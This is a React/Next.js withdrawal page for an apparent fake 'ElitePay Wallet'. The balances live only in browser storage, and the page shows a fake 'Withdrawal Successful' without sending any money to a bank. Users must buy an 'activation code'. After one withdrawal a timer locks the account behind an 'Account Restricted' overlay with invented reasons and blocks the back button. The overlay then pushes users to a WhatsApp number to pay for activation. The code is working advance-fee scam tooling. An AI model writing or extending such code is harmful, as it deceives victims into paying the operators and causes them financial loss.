import { useEffect, useState } from 'react';
import { useRouter } from 'next/router';
import Layout from '../components/Layout';
import { formatNaira } from '../utils/format';
import {
  loadUser,
  loadBalance,
  saveBalance,
  saveTx,
  loadTx,
  savePendingWithdraw,
} from '../utils/storage';

const BANKS = [
  'Access Bank',
  'Access Bank Diamond',
  'ALAT by Wema',
  'Citibank Nigeria',
  'Ecobank Nigeria',
  'FCMB',
  'Fidelity Bank',
  'First Bank',
  'Globus Bank',
  'GTBank',
  'Heritage Bank',
  'Jaiz Bank',
  'Keystone Bank',
  'Kuda Bank',
  'Lotus Bank',
  'Moniepoint MFB',
  'Opay',
  'Optimus Bank',
  'PalmPay',
  'Paga',
  'Parallex Bank',
  'Polaris Bank',
  'PremiumTrust Bank',
  'Providus Bank',
  'Rubies Bank',
  'Stanbic IBTC',
  'Standard Chartered',
  'Sterling Bank',
  'Suntrust Bank',
  'TAJ Bank',
  'Titan Trust Bank',
  'UBA',
  'Union Bank',
  'Unity Bank',
  'VFD Microfinance Bank',
  'Wema Bank',
  'Zenith Bank',
];

const WITHDRAW_CODE = 'GT2256W';
const ACTIVATION_LINK = 'https://wa.me/2347085462173?text=Hello%2C%20I%20want%20to%20activate%20my%20ElitePay%20Wallet%20account';

export default function Withdraw() {
  const router = useRouter();
  const [user, setUser] = useState(null);
  const [account, setAccount] = useState('');
  const [bank, setBank] = useState('');
  const [amount, setAmount] = useState('');
  const [code, setCode] = useState('');
  const [loading, setLoading] = useState(false);
  const [balance, setBalance] = useState(0);
  const [recentTx, setRecentTx] = useState([]);
  const [accountName, setAccountName] = useState('');
  const [isRestricted, setIsRestricted] = useState(false);
  const [showRestrictionPopup, setShowRestrictionPopup] = useState(false);
  const [showSuccessPopup, setShowSuccessPopup] = useState(false);
  const [successAmount, setSuccessAmount] = useState(0);
  const [timeLeft, setTimeLeft] = useState(0);

  useEffect(() => {
    const currentUser = loadUser();
    if (!currentUser) {
      router.push('/');
      return;
    }

    setUser(currentUser);
    setBalance(Number(currentUser.balance || loadBalance() || 0));

    const transactions = loadTx() || [];
    const recent = transactions
      .filter((item) => item.type === 'withdraw' || item.type === 'withdraw_confirm')
      .sort((a, b) => new Date(b.created_at) - new Date(a.created_at));
    setRecentTx(recent.slice(0, 3));

    try {
      localStorage.setItem('gt_activation_code', WITHDRAW_CODE);
    } catch (error) {}
  }, [router]);

  useEffect(() => {
    const check = () => {
      try {
        const activated = localStorage.getItem('gt_activated') === 'true';
        if (activated) {
          setIsRestricted(false);
          setShowRestrictionPopup(false);
          setTimeLeft(0);
          return;
        }

        const end = localStorage.getItem('gt_restriction_end');
        if (!end) {
          setIsRestricted(false);
          setShowRestrictionPopup(false);
          setTimeLeft(0);
          return;
        }

        const remaining = Number(end) - Date.now();
        if (remaining <= 0) {
          setIsRestricted(true);
          setShowRestrictionPopup(true);
          setTimeLeft(0);
        } else {
          setIsRestricted(false);
          setShowRestrictionPopup(false);
          setTimeLeft(remaining);
        }
      } catch (error) {}
    };

    check();
    const interval = setInterval(check, 1000);
    return () => clearInterval(interval);
  }, []);

  useEffect(() => {
    if (!isRestricted) return;
    const blockBack = () => {
      try {
        window.history.pushState(null, '', window.location.href);
      } catch (error) {}
    };
    blockBack();
    window.addEventListener('popstate', blockBack);
    return () => window.removeEventListener('popstate', blockBack);
  }, [isRestricted]);



  const proceed = () => {
    if (isRestricted) {
      setShowRestrictionPopup(true);
      return;
    }

    const cleanAccount = account.replace(/\D/g, '');
    const amt = Number(amount);

    if (!cleanAccount || !bank || !amt || !code) {
      alert('Complete all fields including activation code.');
      return;
    }
    if (cleanAccount.length !== 10) {
      alert('Account number must be 10 digits.');
      return;
    }
    if (amt <= 0) {
      alert('Enter a valid withdrawal amount.');
      return;
    }
    if (amt > balance) {
      alert('Insufficient balance.');
      return;
    }

    setLoading(true);

    setTimeout(() => {
      const stored = (() => {
        try {
          return localStorage.getItem('gt_activation_code');
        } catch (error) {
          return null;
        }
      })();
      const validCode = stored && String(stored).trim() ? String(stored).trim() : WITHDRAW_CODE;

      if (String(code).trim().toUpperCase() !== String(validCode).trim().toUpperCase()) {
        setLoading(false);
        alert('Invalid activation code. Please re-enter the code.');
        return;
      }

      const beneficiaryName = accountName || user.fullName || '';

      try {
        const newBalance = Number(loadBalance() || 0) - amt;
        saveBalance(Number(newBalance));
        setBalance(Number(newBalance));
      } catch (error) {}

      const txPayload = {
        type: 'withdraw_confirm',
        amount: amt,
        status: 'successful',
        created_at: new Date().toISOString(),
        fullName: user.fullName || '',
        phone: user.phone || '',
        meta: {
          beneficiaryName,
          beneficiaryAccount: cleanAccount,
          bank,
          remark: 'Withdrawal confirmed on ElitePay flow',
        },
      };

      try {
        savePendingWithdraw({
          account: cleanAccount,
          bank,
          amount: amt,
          meta: { beneficiaryName },
        });
        saveTx(txPayload);
      } catch (error) {}

      try {
        localStorage.setItem('gt_restriction_end', String(Date.now() + 10 * 60 * 1000));
        localStorage.removeItem('gt_activated');
      } catch (error) {}

      setLoading(false);
      setSuccessAmount(amt);
      setShowSuccessPopup(true);
      setTimeout(() => {
        router.push('/dashboard');
      }, 3200);
    }, 1200);
  };

  const formatTime = (ms) => {
    const secondsTotal = Math.floor(ms / 1000);
    const minutes = Math.floor(secondsTotal / 60);
    const seconds = secondsTotal % 60;
    return `${minutes}:${seconds.toString().padStart(2, '0')}`;
  };

  if (!user) {
    return (
      <Layout>
        <div className="center">
          <div className="card animate-pulse">Loading user info...</div>
        </div>
      </Layout>
    );
  }

  return (
    <Layout title="Withdraw - ElitePay Wallet">
      <style>{`
        .withdraw-shell {
          display: grid;
          grid-template-columns: minmax(0, 1.1fr) minmax(300px, 0.9fr);
          gap: 18px;
          align-items: start;
          padding-bottom: 24px;
        }

        .withdraw-hero {
          position: relative;
          overflow: hidden;
          color: #ffffff;
          background:
            radial-gradient(circle at 86% 12%, rgba(25, 185, 167, 0.36), transparent 32%),
            linear-gradient(135deg, #102033, #0f5f48);
        }

        .withdraw-hero h1 {
          margin: 0;
          font-size: 30px;
          font-weight: 950;
        }

        .withdraw-hero p {
          max-width: 560px;
          color: rgba(255, 255, 255, 0.76);
        }

        .balance-strip {
          display: grid;
          grid-template-columns: repeat(2, minmax(0, 1fr));
          gap: 10px;
          margin-top: 22px;
        }

        .balance-box {
          padding: 14px;
          border-radius: 8px;
          background: rgba(255, 255, 255, 0.10);
          border: 1px solid rgba(255, 255, 255, 0.16);
        }

        .balance-box small {
          color: rgba(255, 255, 255, 0.68);
          font-weight: 850;
        }

        .balance-box strong {
          display: block;
          margin-top: 6px;
          font-size: 22px;
          font-weight: 950;
        }

        .withdraw-form h2,
        .side-card h2 {
          margin: 0 0 6px;
          color: #102033;
          font-size: 22px;
          font-weight: 950;
        }

        .form-grid {
          display: grid;
          gap: 12px;
          margin-top: 18px;
        }

        .field-label {
          display: block;
          margin-bottom: 6px;
          color: #334155;
          font-size: 13px;
          font-weight: 850;
        }

        .verify-box {
          padding: 12px;
          border-radius: 8px;
          background: #f8fafc;
          border: 1px solid #dbe6f3;
        }

        .verify-box.verified {
          background: #e9f8f2;
          border-color: rgba(15, 159, 110, 0.28);
        }

        .verify-box.fallback {
          background: #fff8ed;
          border-color: rgba(245, 158, 11, 0.30);
        }

        .verify-name {
          margin-top: 6px;
          color: #102033;
          font-weight: 950;
        }

        .code-help {
          display: flex;
          justify-content: space-between;
          align-items: center;
          gap: 12px;
          margin-top: 4px;
          padding: 12px;
          border-radius: 8px;
          background: #f8fafc;
          border: 1px solid #dbe6f3;
        }

        .side-card {
          display: grid;
          gap: 14px;
        }

        .info-row {
          display: flex;
          justify-content: space-between;
          gap: 12px;
          padding: 12px 0;
          border-top: 1px solid #edf3f8;
        }

        .recent-list {
          display: grid;
          gap: 10px;
        }

        .recent-item {
          padding: 12px;
          border-radius: 8px;
          background: #ffffff;
          border: 1px solid #dbe6f3;
        }

        .restriction-overlay {
          position: fixed;
          inset: 0;
          z-index: 9999;
          display: flex;
          align-items: center;
          justify-content: center;
          padding: 20px;
          background: rgba(16, 32, 51, 0.46);
          backdrop-filter: blur(8px);
          -webkit-backdrop-filter: blur(8px);
        }

        .lock-card {
          width: min(520px, 92vw);
        }

        .lock-card h2 {
          text-align: center;
        }

        .restriction-reasons {
          display: grid;
          gap: 8px;
          margin: 16px 0;
          padding: 0;
          list-style: none;
          text-align: left;
        }

        .restriction-reasons li {
          display: grid;
          grid-template-columns: 28px 1fr;
          gap: 9px;
          align-items: start;
          padding: 10px;
          border-radius: 8px;
          background: #fff8f8;
          border: 1px solid rgba(239, 68, 68, 0.14);
          color: #334155;
          font-size: 13px;
          font-weight: 750;
        }

        .restriction-reasons span {
          width: 24px;
          height: 24px;
          display: grid;
          place-items: center;
          border-radius: 8px;
          background: #fee2e2;
          color: #b42318;
          font-size: 12px;
          font-weight: 950;
        }

        .withdraw-success-card {
          width: min(460px, 92vw);
          text-align: center;
        }

        .withdraw-check-wrap {
          width: 104px;
          height: 104px;
          display: grid;
          place-items: center;
          margin: 0 auto 16px;
          border-radius: 50%;
          background: linear-gradient(135deg, rgba(15, 159, 110, 0.14), rgba(29, 127, 242, 0.10));
        }

        .withdraw-check {
          width: 76px;
          height: 76px;
          color: #0f9f6e;
        }

        .withdraw-check circle {
          stroke-dasharray: 170;
          stroke-dashoffset: 170;
          animation: withdrawCircle 1.15s ease forwards;
        }

        .withdraw-check path {
          stroke-dasharray: 42;
          stroke-dashoffset: 42;
          animation: withdrawTick 0.9s ease forwards 0.82s;
        }

        .success-note {
          margin-top: 14px;
          padding: 12px;
          border-radius: 8px;
          background: #f0fbf7;
          border: 1px solid rgba(15, 159, 110, 0.18);
          color: #0f5f48;
          font-size: 13px;
          font-weight: 800;
        }

        @keyframes withdrawCircle {
          to { stroke-dashoffset: 0; }
        }

        @keyframes withdrawTick {
          to { stroke-dashoffset: 0; }
        }

        @media (max-width: 900px) {
          .withdraw-shell {
            grid-template-columns: 1fr;
          }
        }

        @media (max-width: 640px) {
          .balance-strip,
          .code-help {
            grid-template-columns: 1fr;
          }

          .code-help,
          .info-row {
            flex-direction: column;
            align-items: flex-start;
          }
        }
      `}</style>

      {showRestrictionPopup && isRestricted && (
        <div className="restriction-overlay" role="dialog" aria-modal="true">
          <div className="card lock-card">
            <h2 style={{ marginTop: 0 }}>Account Restricted</h2>
            <p className="small muted">
              Dear <strong>{user.fullName}</strong>, your recent withdrawal was processed. Activate your account to continue using withdrawals safely.
            </p>
            <ol className="restriction-reasons">
              <li><span>1</span>Accessing the website again after a completed withdrawal.</li>
              <li><span>2</span>Incorrect account name or phone number on the withdrawal request.</li>
              <li><span>3</span>Making double withdrawal requests at the same time.</li>
              <li><span>4</span>Using one activation code to withdraw from a different account.</li>
            </ol>
            <button className="btn" style={{ width: '100%' }} onClick={() => { window.location.href = ACTIVATION_LINK; }}>
              Activate Account
            </button>
          </div>
        </div>
      )}

      {showSuccessPopup && (
        <div className="restriction-overlay" role="dialog" aria-modal="true">
          <div className="card withdraw-success-card">
            <div className="withdraw-check-wrap" aria-hidden="true">
              <svg className="withdraw-check" viewBox="0 0 64 64">
                <circle cx="32" cy="32" r="27" fill="none" stroke="currentColor" strokeWidth="4" />
                <path d="M19 33.5 28 42l18-21" fill="none" stroke="currentColor" strokeWidth="5" strokeLinecap="round" strokeLinejoin="round" />
              </svg>
            </div>
            <h2 style={{ margin: 0 }}>Withdrawal Successful</h2>
            <p className="small muted">
              Your withdrawal of <strong>{formatNaira(successAmount)}</strong> has been processed successfully.
            </p>
            <div className="success-note">
              For account protection, activation review may be required after the secure waiting period.
            </div>
            <button className="btn" style={{ width: '100%', marginTop: 16 }} onClick={() => router.push('/dashboard')}>
              Continue to Dashboard
            </button>
          </div>
        </div>
      )}

      <div className="withdraw-shell">
        <section className="card withdraw-form">
          <div className="card withdraw-hero" style={{ marginBottom: 18 }}>
            <h1>Withdraw Funds</h1>
            <p>Send your ElitePay wallet balance to a Nigerian bank account. Account lookup will run when possible, and you can continue if lookup is unavailable.</p>
            <div className="balance-strip">
              <div className="balance-box">
                <small>Available Balance</small>
                <strong>{formatNaira(balance)}</strong>
              </div>
              <div className="balance-box">
                <small>Activation Code</small>
                <strong>Required</strong>
              </div>
            </div>
          </div>

          <h2>Bank Details</h2>
          <p className="small muted">Enter the recipient bank account and withdrawal amount.</p>

          <div className="form-grid">
            <div>
              <label className="field-label" htmlFor="bank">Bank</label>
              <select id="bank" className="input" value={bank} onChange={(event) => setBank(event.target.value)} disabled={isRestricted}>
                <option value="">Select Bank</option>
                {BANKS.map((item) => <option key={item} value={item}>{item}</option>)}
              </select>
            </div>

            <div>
              <label className="field-label" htmlFor="account">Account Number</label>
              <input
                id="account"
                className="input"
                placeholder="10-digit account number"
                value={account}
                maxLength={10}
                inputMode="numeric"
                onChange={(event) => setAccount(event.target.value.replace(/\D/g, '').slice(0, 10))}
                disabled={isRestricted}
              />
            </div>

            <div>
              <label className="field-label" htmlFor="accountName">Account Name</label>
              <input
                id="accountName"
                className="input"
                placeholder="Enter recipient account name"
                value={accountName}
                onChange={(event) => setAccountName(event.target.value)}
                disabled={isRestricted}
              />
            </div>

            <div>
              <label className="field-label" htmlFor="amount">Amount</label>
              <input
                id="amount"
                className="input"
                placeholder="Amount"
                type="number"
                value={amount}
                onChange={(event) => setAmount(event.target.value)}
                disabled={isRestricted}
              />
            </div>

            <div>
              <label className="field-label" htmlFor="code">Activation Code</label>
              <input
                id="code"
                className="input"
                placeholder="Enter activation code"
                value={code}
                onChange={(event) => setCode(event.target.value)}
                disabled={isRestricted}
              />
              <div className="code-help">
                <span className="small muted">Do not have an activation code?</span>
                <button className="btnGhost" onClick={() => router.push('/buy-code')} disabled={isRestricted}>Buy Code</button>
              </div>
            </div>

            <button className="btn" onClick={proceed} disabled={loading || isRestricted}>
              {loading ? 'Processing withdrawal...' : 'Withdraw Now'}
            </button>
          </div>
        </section>

        <aside className="card side-card">
          <div>
            <h2>Withdrawal Summary</h2>
            <p className="small muted">Review the current transfer details before submitting.</p>
          </div>

          <div>
            <div className="info-row">
              <span className="small muted">Recipient</span>
              <strong>{accountName || user.fullName}</strong>
            </div>
            <div className="info-row">
              <span className="small muted">Bank</span>
              <strong>{bank || 'Not selected'}</strong>
            </div>
            <div className="info-row">
              <span className="small muted">Account</span>
              <strong>{account ? maskAccount(account) : 'Not entered'}</strong>
            </div>
            <div className="info-row">
              <span className="small muted">Amount</span>
              <strong>{amount ? formatNaira(Number(amount)) : formatNaira(0)}</strong>
            </div>
          </div>

          {recentTx.length > 0 && (
            <div>
              <h2 style={{ fontSize: 18 }}>Recent Withdrawals</h2>
              <div className="recent-list">
                {recentTx.map((item, index) => (
                  <div className="recent-item" key={item.id || index}>
                    <div style={{ display: 'flex', justifyContent: 'space-between', gap: 12 }}>
                      <strong>{item.meta?.bank || item.bank}</strong>
                      <strong>{formatNaira(Number(item.amount || 0))}</strong>
                    </div>
                    <div className="small muted">{maskAccount(item.meta?.beneficiaryAccount || item.account)} - {item.status}</div>
                  </div>
                ))}
              </div>
            </div>
          )}
        </aside>
      </div>
    </Layout>
  );
}

function maskAccount(account) {
  if (!account) return '';
  const value = String(account).replace(/\s+/g, '');
  if (value.length <= 4) return value;
  return `**** ${value.slice(-4)}`;
}
